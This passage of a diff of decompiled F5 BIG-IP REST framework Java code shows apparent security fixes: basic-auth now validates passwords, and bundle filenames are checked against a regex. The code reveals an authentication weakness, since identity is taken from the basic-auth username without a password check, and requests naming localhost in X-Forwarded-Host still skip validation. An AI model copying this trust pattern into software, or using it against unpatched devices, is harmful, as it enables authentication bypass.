}\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void fail(Throwable throwable) {\r\n     fail(throwable, false);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void fail(Throwable throwable, boolean allowExternalStackTrace) {\r\n     if (this.completionCount.incrementAndGet() > 1) {\r\n       return;\r\n     }\r\n\r\n     if (this.completion == null) {\r\n       return;\r\n     }\r\n\r\n     if (throwable == null) {\r\n       throwable = new IllegalArgumentException(\"request failed with null exception\");\r\n     }\r\n\r\n     Exception ex = null;\r\n     try {\r\n       if (this.statusCode == 200 || this.statusCode == 202) {\r\n\r\n         this.statusCode = 400;\r\n         if (throwable instanceof RestWorkerUriNotFoundException) {\r\n           this.statusCode = 404;\r\n         }\r\n       }\r\n\r\n       if (generateRestErrorResponse()) {\r\n         setErrorResponseBody(throwable, allowExternalStackTrace);\r\n       }\r\n\r\n       JsonElement jsonBody = getParsedBody();\r\n       if (jsonBody != null && jsonBody instanceof JsonObject) {\r\n         JsonObject jsonObject = (JsonObject)jsonBody;\r\n         if (jsonObject != null) {\r\n           Set<Map.Entry<String, JsonElement>> entries = jsonObject.entrySet();\r\n           boolean setDescription = false;\r\n-          for (Map.Entry<String, JsonElement> current : entries) {\r\n+          for (Iterator<Map.Entry<String, JsonElement>> iter = entries.iterator(); iter.hasNext(); ) {\r\n+            Map.Entry<String, JsonElement> current = iter.next();\r\n             if (current.getValue() != null && RestWorker.isHtmlTagExists(((JsonElement)current.getValue()).toString())) {\r\n               jsonObject.addProperty(current.getKey(), \"HTML Tag-like Content in the Request URL/Body\");\r\n               setBody(jsonObject.toString());\r\n               LOGGER.fine(\"tag-like content on respone with key \" + (String)current.getKey());\r\n             }\r\n\r\n\r\n-            if (((String)current.getKey()).toString().equals(\"code\") && (((JsonElement)current.getValue()).toString().equals(\"400\") || ((JsonElement)current.getValue()).toString().equals(\"500\"))) {\r\n-\r\n+            if (((String)current.getKey()).toString().equals(\"code\") && Integer.parseInt(((JsonElement)current.getValue()).toString()) >= 400) {\r\n\r\n               setDescription = true; continue;\r\n             }  if (setDescription && ((String)current.getKey()).toString().equals(\"originalRequestBody\")) {\r\n\r\n-              jsonObject.remove(current.getKey());\r\n+              iter.remove();\r\n               setBody(jsonObject.toString());\r\n               setDescription = false;\r\n               LOGGER.fine(\"Cleared the request content for key \" + (String)current.getKey());\r\n             }\r\n           }\r\n         }\r\n       }\r\n       ex = RestHelper.convertToException(throwable);\r\n     } catch (Exception e2) {\r\n       LOGGER.warningFmt(\"Unable to generate error body for %s %s %s: %s\", new Object[] { getMethod(), getUri(), Integer.valueOf(getStatusCode()), RestHelper.throwableStackToString(e2) });\r\n     } finally {\r\n\r\n       try {\r\n         this.completion.failed(ex, this);\r\n       } catch (Exception e3) {\r\n         LOGGER.warningFmt(\"failure handler for %s %s %s threw unexpectedly: %s\", new Object[] { getMethod(), getUri(), Integer.valueOf(getStatusCode()), RestHelper.throwableStackToString(e3) });\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setErrorResponseBody(Throwable t) {\r\n     setErrorResponseBody(t, false);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setErrorResponseBody(Throwable t, boolean allowExternalStackTrace) {\r\n     if (t == null)\r\n     {\r\n       t = new IllegalArgumentException(\"Expected exception was null\");\r\n     }\r\n\r\n     boolean excludeStack = (!allowExternalStackTrace && isRequestExternal());\r\n\r\n     String existingBody = getBodyAsString();\r\n     if (existingBody == null || existingBody.isEmpty()) {\r\n\r\n       setBody(RestErrorResponse.create().setCode(this.statusCode).setMessage(t.getLocalizedMessage()).setReferer(this.referer).setRestOperationId(this.id).setErrorStack(excludeStack ? null : RestHelper.throwableStackToList(t)));\r\n\r\n\r\n\r\n       return;\r\n     }\r\n\r\n\r\n\r\n     try {\r\n       boolean isValidErrorResponse = false;\r\n\r\n\r\n       Object errorResponse = getBody(RestErrorResponse.class);\r\n       if (errorResponse instanceof RestErrorResponse) {\r\n         RestErrorResponse restErrorResponse = (RestErrorResponse)errorResponse;\r\n         isValidErrorResponse = (restErrorResponse.getCode() != 0L || restErrorResponse.getOriginalRequestBody() != null || restErrorResponse.getMessage() != null);\r\n       }\r\n\r\n\r\n\r\n\r\n       errorResponse = getBody(RestODataErrorResponse.class);\r\n       if (!isValidErrorResponse && errorResponse instanceof RestODataErrorResponse) {\r\n         RestODataErrorResponse oDataErrorResponse = (RestODataErrorResponse)errorResponse;\r\n         isValidErrorResponse = (oDataErrorResponse.getError() != null && oDataErrorResponse.getError().getCode() != 0);\r\n       }\r\n\r\n\r\n       if (excludeStack) {\r\n         existingBody = cleanStackTrace(existingBody);\r\n         setBody(existingBody);\r\n       }\r\n\r\n\r\n       if (!isValidErrorResponse) {\r\n         setBody(RestErrorResponse.create().setCode(this.statusCode).setOriginalRequestBody(existingBody).setMessage(t.getLocalizedMessage()).setReferer(this.referer).setRestOperationId(this.id).setErrorStack(excludeStack ? null : RestHelper.throwableStackToList(t)));\r\n\r\n\r\n\r\n       }\r\n\r\n\r\n     }\r\n     catch (Exception jsonException) {\r\n       t.addSuppressed(jsonException);\r\n\r\n\r\n       setBody(RestErrorResponse.create().setCode(this.statusCode).setMessage(t.getLocalizedMessage()).setOriginalRequestBody(existingBody).setReferer(this.referer).setRestOperationId(this.id).setErrorStack(excludeStack ? null : RestHelper.throwableStackToList(t)));\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static String cleanStackTrace(String json) {\r\n     if (json != null && json.contains(\"errorStack\")) {\r\n       json = json.replaceAll(\"(?s)(\\\"errorStack\\\"|errorStack)(\\\\s*):(\\\\s*)\\\\[.*]\", \"$1$2:$3[]\");\r\n     }\r\n\r\n\r\n     return json;\r\n   }\r\n\r\n   private boolean isRequestExternal() {\r\n     boolean isExternal = true;\r\n\r\n     try {\r\n       isExternal = RestStatic.isExternalRequest(this);\r\n     } catch (Exception e) {\r\n\r\n       LOGGER.severe(\"Unable to determine if request is external: \" + e.getMessage());\r\n     }\r\n\r\n     return isExternal;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public Object clone() {\r\n     RestOperation copy = new RestOperation();\r\n     copy.completion = this.completion;\r\n     copy.retriesRemaining = this.retriesRemaining;\r\n     copy.parameters.putAll(this.parameters);\r\n     copy.uri = (this.uri == null) ? null : URI.create(this.uri.toString());\r\n     copy.expiration = new Date(this.expiration.getTime());\r\n     copy.method = this.method;\r\n     copy.accept = this.accept;\r\n     copy.allow = this.allow;\r\n     copy.resourceDeprecated = this.resourceDeprecated;\r\n     copy.resourceEarlyAccess = this.resourceEarlyAccess;\r\n     copy.propertyDeprecated = this.propertyDeprecated;\r\n     copy.propertyEarlyAccess = this.propertyEarlyAccess;\r\n     copy.xF5ConfigApiStatus = this.xF5ConfigApiStatus;\r\n     copy.contentType = this.contentType;\r\n     copy.contentDisposition = this.contentDisposition;\r\n     copy.body = this.body;\r\n     copy.binaryBody = this.binaryBody;\r\n     copy.contentLength = this.contentLength;\r\n     copy.contentRange = this.contentRange;\r\n     copy.serverCertificateChain = this.serverCertificateChain;\r\n     copy.isForceSocketEnabled = this.isForceSocketEnabled;\r\n     copy.isRollbackRequest = this.isRollbackRequest;\r\n     copy.restOperationFlags = EnumSet.copyOf(this.restOperationFlags);\r\n     copy.statusCode = this.statusCode;\r\n     if (this.authorizationData != null) {\r\n       copy.authorizationData = new AuthorizationData();\r\n       copy.authorizationData.basicAuthValue = this.authorizationData.basicAuthValue;\r\n       copy.authorizationData.xAuthToken = this.authorizationData.xAuthToken;\r\n       copy.authorizationData.xF5AuthTokenState = (this.authorizationData.xF5AuthTokenState == null) ? null : RestHelper.<AuthTokenItemState>copy(this.authorizationData.xF5AuthTokenState);\r\n\r\n\r\n       copy.authorizationData.wwwAuthenticate = this.authorizationData.wwwAuthenticate;\r\n     }\r\n     if (this.identityData != null) {\r\n       copy.identityData = new IdentityData();\r\n       copy.identityData.userName = this.identityData.userName;\r\n       if (!RestReference.isNullOrEmpty(this.identityData.userReference)) {\r\n         URI uriCopy = URI.create(this.identityData.userReference.link.toString());\r\n         copy.identityData.userReference = new RestReference(uriCopy);\r\n       }\r\n       if (this.identityData.groupReferences != null) {\r\n         copy.identityData.groupReferences = new RestReference[this.identityData.groupReferences.length];\r\n\r\n         for (int i = 0; i < this.identityData.groupReferences.length; i++) {\r\n           if (!RestReference.isNullOrEmpty(this.identityData.groupReferences[i])) {\r\n\r\n\r\n             URI uriCopy = URI.create((this.identityData.groupReferences[i]).link.toString());\r\n             copy.identityData.groupReferences[i] = new RestReference(uriCopy);\r\n           }\r\n         }\r\n       }\r\n     }  copy.transferEncoding = this.transferEncoding;\r\n     copy.sourceAddress = this.sourceAddress;\r\n     copy.referer = this.referer;\r\n     copy.coordinationId = this.coordinationId;\r\n     copy.xForwardedFor = this.xForwardedFor;\r\n     copy.identifiedGroupName = this.identifiedGroupName;\r\n     copy.isTrustedRequest = this.isTrustedRequest;\r\n\r\n\r\n\r\n     copy.isConnectionCloseRequested = this.isConnectionCloseRequested;\r\n     copy.isConnectionKeepAlive = this.isConnectionKeepAlive;\r\n\r\n     if (RestHelper.getOperationTracingLevel().intValue() <= Level.FINER.intValue()) {\r\n\r\n       copy.responseHeadersTrace = this.responseHeadersTrace;\r\n       copy.requestHeadersTrace = this.requestHeadersTrace;\r\n     }\r\n\r\n     if (this.additionalHeaders != null && this.additionalHeaders[0] != null) {\r\n       copy.allocateHttpHeaders();\r\n       copy.additionalHeaders[Direction.REQUEST.getIndex()] = (HttpHeaderFields)this.additionalHeaders[Direction.REQUEST.getIndex()].clone();\r\n     }\r\n\r\n\r\n     if (this.additionalHeaders != null && this.additionalHeaders[1] != null) {\r\n       copy.allocateHttpHeaders();\r\n       copy.additionalHeaders[Direction.RESPONSE.getIndex()] = (HttpHeaderFields)this.additionalHeaders[Direction.RESPONSE.getIndex()].clone();\r\n     }\r\n\r\n\r\n\r\n     copy.isRestErrorResponseRequired = this.isRestErrorResponseRequired;\r\n     copy.isPublicRequest = this.isPublicRequest;\r\n     copy.senderNote = this.senderNote;\r\n     copy.gossipHeader = this.gossipHeader;\r\n\r\n\r\n\r\n     return copy;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static String toJson(Object src) {\r\n     return gson.toJson(src);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static JsonElement toJsonTree(String src) {\r\n     return (new JsonParser()).parse(src);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static JsonElement toJsonTree(Object src) {\r\n     return gson.toJsonTree(src);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static String toJsonWithEnumValues(Object src) {\r\n     return extendedGson.toJson(src);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static <T> T fromJson(String json, Class<T> classOfT) throws JsonSyntaxException {\r\n     return (T)gson.fromJson(json, classOfT);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static <T> T fromJson(Reader json, Class<T> classOfT) throws JsonSyntaxException {\r\n     return (T)gson.fromJson(json, classOfT);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static <T> T fromJson(JsonElement parsedJson, Class<T> classOfT) throws JsonSyntaxException {\r\n     return (T)gson.fromJson(parsedJson, classOfT);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static <T> T fromObject(Object src, Class<T> classOfT) throws JsonSyntaxException {\r\n     return (T)gson.fromJson(gson.toJson(src), classOfT);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation nestCompletion(final RestRequestCompletion beforeCompletion) {\r\n     final RestRequestCompletion original = this.completion;\r\n     RestRequestCompletion wrapper = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation request)\r\n         {\r\n           request.resetCompletionCount();\r\n           request.setCompletion(original);\r\n           beforeCompletion.completed(RestOperation.this);\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, RestOperation request) {\r\n           request.resetCompletionCount();\r\n           request.setCompletion(original);\r\n           beforeCompletion.failed(ex, request);\r\n         }\r\n       };\r\n\r\n     return setCompletion(wrapper);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/common/RestOperationIdentifier.java b/com/f5/rest/common/RestOperationIdentifier.java\r\nindex d7941ba..cf955b9 100644\r\n--- a/com/f5/rest/common/RestOperationIdentifier.java\r\n+++ b/com/f5/rest/common/RestOperationIdentifier.java\r\n@@ -1,249 +1,334 @@\r\n package com.f5.rest.common;\r\n\r\n+import com.f5.rest.tmos.bigip.authn.providers.mcpremote.TmosAuthProviderCollectionWorker;\r\n import com.f5.rest.workers.AuthTokenItemState;\r\n+import com.f5.rest.workers.ForwarderPassThroughWorker;\r\n+import com.f5.rest.workers.authn.providers.AuthProviderLoginState;\r\n import com.f5.rest.workers.authz.AuthzHelper;\r\n import com.f5.rest.workers.device.DeviceCertificateState;\r\n import java.net.URI;\r\n+import java.net.URISyntaxException;\r\n import java.security.interfaces.RSAPublicKey;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n public class RestOperationIdentifier\r\n {\r\n   private static RestLogger LOGGER = new RestLogger(RestOperationIdentifier.class, null);\r\n\r\n+  static final String TMOS_AUTH_LOGIN_PROVIDER_WORKER_URI_PATH = TmosAuthProviderCollectionWorker.WORKER_URI_PATH + \"/\" + TmosAuthProviderCollectionWorker.generatePrimaryKey(\"tmos\") + \"/login\";\r\n+\r\n+\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static void setIdentityFromAuthenticationData(RestOperation request, Runnable completion) {\r\n     if (setIdentityFromDeviceAuthToken(request, completion)) {\r\n       return;\r\n     }\r\n     if (setIdentityFromF5AuthToken(request)) {\r\n       completion.run();\r\n       return;\r\n     }\r\n-    if (setIdentityFromBasicAuth(request)) {\r\n-      completion.run();\r\n-\r\n+    if (setIdentityFromBasicAuth(request, completion)) {\r\n       return;\r\n     }\r\n+\r\n     completion.run();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static void updateIdentityFromAuthenticationData(RestOperation request) {\r\n     if (getRequestDeviceAuthToken(request) != null) {\r\n       return;\r\n     }\r\n\r\n\r\n     if (setIdentityFromF5AuthToken(request)) {\r\n       return;\r\n     }\r\n-    if (setIdentityFromBasicAuth(request)) {\r\n+    if (setIdentityFromBasicAuth(request, null)) {\r\n       return;\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   private static String getRequestDeviceAuthToken(RestOperation request) {\r\n     return request.getParameter(\"em_server_auth_token\");\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static boolean setIdentityFromDeviceAuthToken(final RestOperation incomingRequest, final Runnable finalRunnable) {\r\n     final String authToken = getRequestDeviceAuthToken(incomingRequest);\r\n     if (authToken == null) {\r\n       return false;\r\n     }\r\n     final String ipAddress = incomingRequest.getParameter(\"em_server_ip\");\r\n\r\n\r\n\r\n     boolean isCmiKey = Boolean.parseBoolean(incomingRequest.getParameter(\"em_cmi_key\"));\r\n\r\n\r\n\r\n\r\n\r\n\r\n     if (WellKnownPorts.getUseDeviceGroupKeyPairs() || WellKnownPorts.getUseBothDeviceAndGroupCertificates() || isCmiKey)\r\n     {\r\n       return setIdentityFromDeviceAuthTokenOnDisk(incomingRequest, finalRunnable, authToken, ipAddress, isCmiKey);\r\n     }\r\n\r\n\r\n     URI certificateUri = UrlHelper.buildLocalUriSafe(incomingRequest.getUri().getPort(), new String[] { \"shared/device-certificates\", ipAddress });\r\n\r\n\r\n\r\n     RestRequestCompletion completion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation certRequest) {\r\n           DeviceCertificateState certificate = certRequest.<DeviceCertificateState>getTypedBody(DeviceCertificateState.class);\r\n\r\n           RestOperationIdentifier.setIdentityFromDeviceAuthToken(authToken, certificate.certificate.getBytes(), certificate.deviceUserReference, incomingRequest);\r\n\r\n\r\n\r\n           finalRunnable.run();\r\n         }\r\n\r\n\r\n\r\n\r\n\r\n         public void failed(Exception exception, RestOperation certRequest) {\r\n           RestOperationIdentifier.LOGGER.fineFmt(\"Get device-certificate %s for %s: %s\", new Object[] { this.val$ipAddress, this.val$incomingRequest.getReferer(), exception });\r\n\r\n           finalRunnable.run();\r\n         }\r\n       };\r\n\r\n     RestOperation certRequest = RestOperation.create().setUri(certificateUri).setCompletion(completion).setReferer(RestOperationIdentifier.class.getName());\r\n\r\n\r\n\r\n     RestRequestSender.sendGet(certRequest);\r\n     return true;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static boolean setIdentityFromDeviceAuthTokenOnDisk(final RestOperation incomingRequest, final Runnable finalRunnable, final String authToken, final String ipAddress, final boolean isCmiKey) {\r\n     DeviceAuthTokenHelper.getPublicKeyBytes(ipAddress, isCmiKey, new CompletionHandler<byte[]>()\r\n         {\r\n           public void completed(byte[] data)\r\n           {\r\n             RestOperationIdentifier.setIdentityFromDeviceAuthToken(authToken, data, null, incomingRequest);\r\n             finalRunnable.run();\r\n           }\r\n\r\n\r\n\r\n\r\n           public void failed(Exception exception, byte[] data) {\r\n             RestOperationIdentifier.LOGGER.fineFmt(\"Read public key %s/%s for %s: %s\", new Object[] { this.val$ipAddress, Boolean.valueOf(this.val$isCmiKey), this.val$incomingRequest.getReferer(), exception });\r\n\r\n             finalRunnable.run();\r\n           }\r\n         });\r\n\r\n     return true;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static void setIdentityFromDeviceAuthToken(String authToken, byte[] publicKeyBytes, RestReference deviceUserReference, RestOperation request) {\r\n     RSAPublicKey publicKey;\r\n     DeviceAuthToken deviceAuthToken;\r\n     try {\r\n       publicKey = DeviceAuthTokenHelper.makePublicKeyFromBytes(publicKeyBytes);\r\n     } catch (Exception exception) {\r\n\r\n\r\n       LOGGER.warningFmt(\"Public key file on disk error: %s\", new Object[] { RestHelper.throwableStackToString(exception) });\r\n\r\n\r\n       return;\r\n     }\r\n\r\n     try {\r\n       deviceAuthToken = DeviceAuthTokenHelper.decryptAuthToken(authToken, publicKey);\r\n     } catch (Exception exception) {\r\n       LOGGER.fineFmt(\"Invalid auth token %s from %s: %s\", new Object[] { authToken, request.getReferer(), exception });\r\n\r\n       return;\r\n     }\r\n\r\n     LOGGER.finestFmt(\"token timestamp=%s\", new Object[] { Integer.valueOf(deviceAuthToken.getTimestamp()) });\r\n\r\n     if (deviceUserReference == null) {\r\n       deviceUserReference = AuthzHelper.getDefaultAdminReference();\r\n     }\r\n     request.setIdentityData(null, deviceUserReference, null);\r\n\r\n\r\n     request.setTrustedRequest(true);\r\n   }\r\n\r\n\r\n\r\n\r\n   private static boolean setIdentityFromF5AuthToken(RestOperation request) {\r\n     AuthTokenItemState token = request.getXF5AuthTokenState();\r\n     if (token == null) {\r\n       return false;\r\n     }\r\n     request.setIdentityData(token.userName, token.user, AuthzHelper.toArray(token.groupReferences));\r\n\r\n     return true;\r\n   }\r\n\r\n\r\n\r\n\r\n-  private static boolean setIdentityFromBasicAuth(RestOperation request) {\r\n+\r\n+\r\n+  private static boolean setIdentityFromBasicAuth(final RestOperation request, final Runnable runnable) {\r\n     String authHeader = request.getBasicAuthorization();\r\n     if (authHeader == null) {\r\n       return false;\r\n     }\r\n-    AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n-    request.setIdentityData(components.userName, null, null);\r\n+    final AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+    String xForwardedHostHeaderValue = request.getAdditionalHeader(\"X-Forwarded-Host\");\r\n+\r\n+\r\n+\r\n+    if (xForwardedHostHeaderValue == null) {\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+\r\n+\r\n+    String[] valueList = xForwardedHostHeaderValue.split(\", \");\r\n+    int valueIdx = (valueList.length > 1) ? (valueList.length - 1) : 0;\r\n+    if (valueList[valueIdx].contains(\"localhost\") || valueList[valueIdx].contains(\"127.0.0.1\")) {\r\n+\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+\r\n+    if (!PasswordUtil.isPasswordReset().booleanValue()) {\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+    AuthProviderLoginState loginState = new AuthProviderLoginState();\r\n+    loginState.username = components.userName;\r\n+    loginState.password = components.password;\r\n+    loginState.address = request.getRemoteSender();\r\n+    RestRequestCompletion authCompletion = new RestRequestCompletion()\r\n+      {\r\n+        public void completed(RestOperation subRequest) {\r\n+          request.setIdentityData(components.userName, null, null);\r\n+          if (runnable != null) {\r\n+            runnable.run();\r\n+          }\r\n+        }\r\n+\r\n+\r\n+        public void failed(Exception ex, RestOperation subRequest) {\r\n+          RestOperationIdentifier.LOGGER.warningFmt(\"Failed to validate %s\", new Object[] { ex.getMessage() });\r\n+          if (ex.getMessage().contains(\"Password expired\")) {\r\n+            request.fail(new SecurityException(ForwarderPassThroughWorker.CHANGE_PASSWORD_NOTIFICATION));\r\n+          }\r\n+          if (runnable != null) {\r\n+            runnable.run();\r\n+          }\r\n+        }\r\n+      };\r\n+\r\n+    try {\r\n+      RestOperation subRequest = RestOperation.create().setBody(loginState).setUri(UrlHelper.makeLocalUri(new URI(TMOS_AUTH_LOGIN_PROVIDER_WORKER_URI_PATH), null)).setCompletion(authCompletion);\r\n+\r\n+\r\n+      RestRequestSender.sendPost(subRequest);\r\n+    } catch (URISyntaxException e) {\r\n+      LOGGER.warningFmt(\"ERROR: URISyntaxEception %s\", new Object[] { e.getMessage() });\r\n+    }\r\n     return true;\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/tmos/bigip/access/iapp/IAppBundleInstallTaskCollectionWorker.java b/com/f5/rest/tmos/bigip/access/iapp/IAppBundleInstallTaskCollectionWorker.java\r\nindex afc6890..7a0fe79 100644\r\n--- a/com/f5/rest/tmos/bigip/access/iapp/IAppBundleInstallTaskCollectionWorker.java\r\n+++ b/com/f5/rest/tmos/bigip/access/iapp/IAppBundleInstallTaskCollectionWorker.java\r\n@@ -1,788 +1,803 @@\r\n package com.f5.rest.tmos.bigip.access.iapp;\r\n\r\n import com.f5.rest.common.CompletionHandler;\r\n import com.f5.rest.common.RestHelper;\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestRequestCompletion;\r\n import com.f5.rest.common.RestServer;\r\n import com.f5.rest.common.RestThreadManager;\r\n import com.f5.rest.common.UrlHelper;\r\n import com.f5.rest.common.Utilities;\r\n import com.f5.rest.common.VersionUtil;\r\n import com.f5.rest.tmos.bigip.access.util.LangUtil;\r\n import com.f5.rest.workers.DeviceInfoState;\r\n import com.f5.rest.workers.device.DeviceInfoWorker;\r\n import com.f5.rest.workers.iapp.IAppPackageManagementTaskCollectionWorker;\r\n import com.f5.rest.workers.iapp.IAppPackageManagementTaskState;\r\n import com.f5.rest.workers.iapp.packaging.GlobalInstalledPackageCollectionWorker;\r\n import com.f5.rest.workers.iapp.packaging.InstalledPackageCollectionState;\r\n import com.f5.rest.workers.iapp.packaging.InstalledPackageState;\r\n import com.f5.rest.workers.shell.ShellExecutionResult;\r\n import com.f5.rest.workers.shell.ShellExecutor;\r\n import com.f5.rest.workers.task.AbstractTaskCollectionWorker;\r\n import com.f5.rest.workers.task.TaskCompletion;\r\n import com.f5.rest.workers.task.TaskItemState;\r\n import com.google.gson.JsonObject;\r\n import java.io.ByteArrayInputStream;\r\n import java.io.File;\r\n import java.io.IOException;\r\n import java.io.InputStream;\r\n import java.io.InputStreamReader;\r\n import java.net.URI;\r\n import java.nio.ByteBuffer;\r\n import java.nio.channels.AsynchronousFileChannel;\r\n import java.nio.channels.CompletionHandler;\r\n import java.nio.file.OpenOption;\r\n import java.nio.file.Path;\r\n import java.nio.file.Paths;\r\n import java.nio.file.StandardOpenOption;\r\n import java.util.ArrayList;\r\n import java.util.Date;\r\n import java.util.concurrent.TimeUnit;\r\n+import java.util.regex.Matcher;\r\n+import java.util.regex.Pattern;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n public class IAppBundleInstallTaskCollectionWorker\r\n   extends AbstractTaskCollectionWorker<IAppBundleInstallTaskState, IAppBundleInstallCollectionState>\r\n {\r\n   private static final String AGC_USE_CASE_PACK_BUILD_NOT_FOUND = \"Access Guided Configuration use case pack name does not contain build number\";\r\n   private static final String AGC_PACK_NOT_FOUND = \"Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.\";\r\n   public static final String IAPP_BUNDLE_INSTALL_TASKS_SEGMENT = \"bundle-install-tasks\";\r\n   public static final String WORKER_URI_PATH = UrlHelper.buildUriPath(new String[] { \"tm/\", \"access\", \"bundle-install-tasks\" });\r\n\r\n\r\n   private static final String ERROR_TASK_BODY_INVALID = \"IApp bundle install task body is invalid.\";\r\n\r\n+\r\n   private static final String TAR_FILE_PATH = \"/var/apm/f5-iappslx-agc-usecase-pack/\";\r\n\r\n   private static final String RPMS_FILE_PATH = \"/var/config/rest/downloads/\";\r\n\r\n   private static final String FRAMEWORK = \"framework\";\r\n\r\n   private static final String AGC_USECASE_PACK_INFO_WORKER_URI_PATH = \"/mgmt/tm/access/usecase-pack-info\";\r\n\r\n   private static final String AGC_USE_CASE_PACK_VERSION = \"usecasePackVersion\";\r\n\r\n   private static final String AGC_USE_CASE_PACK_BUILD = \"usecasePackBuild\";\r\n\r\n   private String bigIpVersion;\r\n\r\n   private static final int MAX_RETRY_COUNT = 5;\r\n\r\n   private static final int RETRY_WAIT_TIME_MULTIPLIER = 5000;\r\n\r\n+  private static final Pattern validFilePathChars = Pattern.compile(\"(^[a-zA-Z][a-zA-Z0-9_.\\\\-\\\\s()]*)\\\\.([tT][aA][rR]\\\\.[gG][zZ])$\");\r\n\r\n   public IAppBundleInstallTaskCollectionWorker() {\r\n     super(IAppBundleInstallTaskState.class, IAppBundleInstallCollectionState.class);\r\n\r\n\r\n     this.state = new IAppBundleInstallCollectionState();\r\n\r\n\r\n\r\n     setReplicated(false);\r\n\r\n     setIndexed(true);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n     setIsObliteratedOnDelete(true);\r\n\r\n     configureTaskJanitor(TimeUnit.HOURS.toMillis(1L), TimeUnit.DAYS.toMillis(1L));\r\n   }\r\n\r\n\r\n\r\n\r\n   public void onStart(RestServer server) {\r\n     completeStart(IAppBundleInstallCollectionState.class, new URI[] { buildLocalUri(new String[] { IAppPackageManagementTaskCollectionWorker.WORKER_URI_PATH }) });\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void validateTaskRequest(IAppBundleInstallTaskState taskState) throws Exception {\r\n     if (taskState == null) {\r\n       throw new IllegalArgumentException(\"IApp bundle install task body is invalid.\");\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   protected void startTask(IAppBundleInstallTaskState taskState) {\r\n     taskState.status = TaskItemState.Status.STARTED;\r\n     if (taskState.startTime == null) {\r\n       taskState.startTime = new Date();\r\n     }\r\n     taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.VALIDATE_GZIP_BUNDLE;\r\n     sendStatusUpdate(taskState);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public void processTaskStep(IAppBundleInstallTaskState taskState, Object userData) {\r\n     int retryCount;\r\n     switch (taskState.step) {\r\n       case VALIDATE_GZIP_BUNDLE:\r\n         validateGzipBundle(taskState);\r\n         return;\r\n       case QUERY_INSTALLED_RPM:\r\n         queryInstalledRpm(taskState);\r\n         return;\r\n       case QUERY_BIGIP_VERSION:\r\n         queryBigipVersion(taskState);\r\n         return;\r\n       case EXTRACT_RPMS_FROM_BUNDLE:\r\n         extractRpmsFromBundle(taskState);\r\n         return;\r\n       case READ_MANIFEST_FILE:\r\n         readManifestFile(taskState);\r\n         return;\r\n       case FILTER_RPMS_ON_MIN_BIGIP_VERSION_REQUIRED:\r\n         filterRpmsOnMinBigipVersionRequired(taskState);\r\n         return;\r\n       case INSTALL_FRAMEWORK_RPM:\r\n         